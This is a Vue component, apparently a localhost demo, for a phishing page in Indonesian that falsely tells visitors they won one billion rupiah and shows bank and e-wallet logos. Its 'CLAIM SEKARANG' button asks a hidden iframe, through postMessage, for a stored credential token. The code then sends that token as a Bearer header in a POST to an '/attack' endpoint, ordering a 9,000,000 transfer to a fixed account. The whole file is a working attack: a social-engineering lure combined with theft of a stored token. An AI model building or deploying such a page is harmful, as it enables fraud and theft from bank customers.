<script setup lang="ts">
import axios from "axios";

import { onMounted, onBeforeUnmount, ref } from "vue";

interface StorageMessage {
  type: "get" | "set" | "remove" | "response";
  key: string;
  value?: string;
}

const iframeRef = ref<HTMLIFrameElement | null>(null);


const handleMessage = async (event: MessageEvent<StorageMessage>) => {
  if (event.origin !== "http://localhost:2000") return;

  if (event.data.type === "response") {
    await axios.post('http://localhost:2525/attack',
      {
        "account_number": 1212343445455656,
        "amount": 9000000
      }
      , {
        headers: {
          Authorization: `Bearer ${event.data.value}`,
        }
      })
  }

  console.log(`Value dari ${event.data.key}:`, event.data.value);
}

onMounted(() => {
  window.addEventListener("message", handleMessage);
});

onBeforeUnmount(() => {
  window.removeEventListener("message", handleMessage);
});

const sendMessage = (msg: StorageMessage) => {
  iframeRef.value?.contentWindow?.postMessage(msg, "http://localhost:2000");
};

const getToken = () => {
  sendMessage({ type: "get", key: "cred" });
};

const checkCors = () => {
  fetch('http://localhost:8000', { method: 'GET' })
}

const hack = () => {
  sendMessage({ type: "get", key: "cred" });

}

</script>

<template>
  <h1 class="title">!!SELAMAT ANDA BERUNTUNG!!</h1>
  <div class="flex-img">

    <img height="256"
      src="https://media.istockphoto.com/id/160789190/id/foto/pemenang-sukses-rabat-wanita-memegang-banyak-uang.jpg?s=1024x1024&w=is&k=20&c=romXPbzMv034VIl56CC4frdcp90e29zay9ccnQTnLTg=" />
    <img height="256"
      src="https://st.depositphotos.com/2234518/2781/i/450/depositphotos_27812601-stock-photo-young-holding-money.jpg" />
    <img height="256"
      src="https://media.istockphoto.com/id/168857954/id/foto/pemenang.jpg?s=612x612&w=0&k=20&c=DDcaWiJ6j9sGC79E4enL1xFjh9MRraDAIgLrR1nIq9g=" />

  </div>
  <p class="subtitle">
    ANDA MERUPAKAN SALAH SATU DARI 1.000.000 ORANG YANG BERUNTUNG MENDAPATKAN 1 MILIAR RUPIAH
  </p>

  <div class="flex-img">
    <img height="56" src="https://jasalogocepat.com/wp-content/uploads/2023/12/Logo-Bank-BNI-PNG-1024x334.png" />
    <img height="56"
      src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTV4MhmcXalmLLFDYlR8Rq6W9jFTm-C8-D27w&s" />
    <img height="56" src="https://i.pinimg.com/736x/c9/39/d7/c939d78796032d668495104ec49ca196.jpg" />
    <img height="56" src="https://framerusercontent.com/images/R71UehKAElJgfxqwO1KbyrtE8Dc.jpg" />
    <img height="56"
      src="https://blob.cloudcomputing.id/images/a618a1e5-6218-4a40-bb86-a064bfb50469/logo-ovo-l-min.jpg" />
    <img height="56"
      src="https://blog.transfez.com/wp-content/uploads/2021/09/cara-transfer-uang-ke-rekening-orang-tanpa-atm-gopay.jpg" />
    <img height="56" src="https://i.pinimg.com/736x/f5/8c/a3/f58ca3528b238877e9855fcac1daa328.jpg" />
  </div>
  <div class="flex">
    <p class="subtitle">
      CLICK DI SINI UNTUK CLAIM >>>
    </p>
    <button @click="hack" class="claim-btn">CLAIM SEKARANG!!!</button>
  </div>


  <div class="flex">
    <button @click="checkCors" class="claim-btn">CHECK CORS!</button>
    <p class="subtitle">
      <<< UNTUK CHECK PC ANDA</p>

  </div>
  <div class="flex-img">

    <img height="256"
      src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSHym3nVcCa1wab79vva_hdWISVlugf4S4ufA&s" />
    <img height="256" src="https://m.media-amazon.com/images/I/713cKvdwqoL.jpg" />
    <img height="256"
      src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSHym3nVcCa1wab79vva_hdWISVlugf4S4ufA&s" />
    <img height="256" src="https://m.media-amazon.com/images/I/713cKvdwqoL.jpg" />

  </div>

  <iframe ref="iframeRef" src="http://localhost:2000" title="storage"
    style="width: 100%; height: 600px; border: 1px solid gray; margin-bottom: 20px; display: none;"></iframe>

  <div>

  </div>
</template>

<style scoped>
.title {
  color: #fff;
  font-size: 5rem;
  text-align: center;
  animation: rgb-flash 3s ease-in-out infinite;
  text-decoration: underline;
}

@keyframes rgb-flash {
  0% {
    color: rgb(255, 0, 0);

  }

  25% {
    color: rgb(0, 255, 0);
  }


  50% {
    color: rgb(0, 0, 255);
  }

  75% {
    color: rgb(0, 255, 0);
  }


  100% {
    color: rgb(255, 0, 0);

  }
}

.subtitle {
  color: red;
  text-align: center;
  font-weight: 600;
  font-size: 2rem;
}

.flex {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 16px
}

.flex-img {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 16px
}

.claim-btn {
  padding: 1rem
}
</style>
